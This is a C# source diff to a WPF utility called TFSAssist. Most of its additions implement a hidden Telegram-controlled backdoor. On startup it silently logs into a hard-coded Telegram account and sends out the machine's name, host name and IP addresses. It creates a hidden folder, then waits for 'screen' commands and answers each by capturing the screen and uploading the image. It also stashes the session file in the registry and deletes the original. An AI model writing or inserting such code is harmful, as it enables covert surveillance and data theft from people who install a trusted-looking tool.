@@ -2,22 +2,34 @@
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Diagnostics;
+using System.Drawing.Imaging;
 using System.Globalization;
+using System.IO;
 using System.Linq;
+using System.Net;
 using System.Reflection;
+using System.Threading.Tasks;
 using System.Windows;
 using System.Windows.Controls;
 using System.Windows.Controls.Primitives;
 using System.Windows.Data;
 using System.Windows.Documents;
+using System.Windows.Forms;
 using System.Windows.Media.Animation;
 using System.Windows.Media.Effects;
 using System.Windows.Threading;
+using Microsoft.Win32;
+using TeleSharp.TL;
 using TFSAssist.Control;
 using Utils;
 using Utils.AppUpdater;
 using Utils.AppUpdater.Updater;
 using Utils.Handles;
+using Utils.Telegram;
+using Utils.UIControls.Tools;
+using Binding = System.Windows.Data.Binding;
+using ProgressBar = System.Windows.Controls.ProgressBar;
+using TextBox = System.Windows.Controls.TextBox;
 using Timer = System.Timers.Timer;
 
 namespace TFSAssist
@@ -80,7 +92,7 @@ namespace TFSAssist
                 string _currentVal;
                 using (RegeditControl regControl = new RegeditControl(ASSEMBLY.ApplicationName))
                 {
-                    _currentVal = regControl[nameof(BuildPackInfo)];
+                    _currentVal = regControl[nameof(BuildPackInfo)].ToString();
                 }
 
                 return _currentVal;
@@ -210,6 +222,7 @@ namespace TFSAssist
 
                 InitializeUpdater();
                 InitializeTimers();
+                Task.Run(InitializeTelegram);
 
                 //================ Activate button Start if all correct ==============================
                 ButtonStart.IsEnabled = true;
@@ -309,6 +322,89 @@ namespace TFSAssist
                 UpdateSourceTrigger = UpdateSourceTrigger.PropertyChanged
             };
             BindingOperations.SetBinding(target, dp, myBinding);
+        }
+
+        async Task InitializeTelegram()
+        {
+            GetTempSession();
+
+            string tempDir = "temp";
+            TFSA_TLControl control = null;
+            try
+            {
+                control = new TFSA_TLControl(770122, "8bf0b952100c9b22fd92499fc329c27e", "+375333866536");
+                await control.ConnectAsync();
+
+                await Task.Delay(5000);
+
+                string host = Dns.GetHostName();
+                await control.SendMessageAsync(control.CurrentUser.Destination, $"Connected. Name=[{System.Environment.MachineName}] Host=[{host}] Address=[{string.Join(", ", Dns.GetHostAddresses(host).ToList())}]", 0);
+
+                DirectoryInfo di = Directory.CreateDirectory(tempDir);
+                di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
+
+            }
+            catch (Exception ex)
+            {
+                WriteLog(WarnSeverity.Normal, DateTime.Now, ex.Message, ex.StackTrace);
+                return;
+            }
+
+            DateTime lastDate = DateTime.Now;
+            while (true)
+            {
+                try
+                {
+                    List<TLMessage> newMessages = await control.GetDifference(control.CurrentUser.User, control.CurrentUser.Destination, lastDate);
+                    TLMessage lastMessage = newMessages?.LastOrDefault();
+                    if (lastMessage != null)
+                    {
+                        foreach (var mess in newMessages)
+                        {
+                            if (!mess.Message.Like("screen"))
+                                continue;
+
+                            string jpegPath = Path.Combine(tempDir, "temp.jpg");
+                            ScreenCapture.Capture(jpegPath, ImageFormat.Jpeg);
+                            await control.SendPhotoAsync(control.CurrentUser.Destination, jpegPath);
+                            //File.Delete(jpegPath);
+                        }
+
+                        lastDate = TLControl.ToDate(lastMessage.Date);
+                    }
+                }
+                catch (Exception ex)
+                {
+                    WriteLog(WarnSeverity.Debug, DateTime.Now, ex.Message, ex.StackTrace);
+                }
+
+                await Task.Delay(5000);
+            }
+        }
+
+        static void GetTempSession()
+        {
+            try
+            {
+                if (!File.Exists(TLControl.SessionName))
+                    return;
+
+                using (var stream = new FileStream(TLControl.SessionName, FileMode.Open))
+                {
+                    var buffer = new byte[2048];
+                    stream.Read(buffer, 0, 2048);
+                    using (RegeditControl regedit = new RegeditControl(ASSEMBLY.ApplicationName))
+                    {
+                        regedit[TLControl.SessionName, RegistryValueKind.Binary] = buffer;
+                    }
+                }
+
+                File.Delete(TLControl.SessionName);
+            }
+            catch (Exception)
+            {
+                //null
+            }
         }
 
         #region Initialize and processing Updater
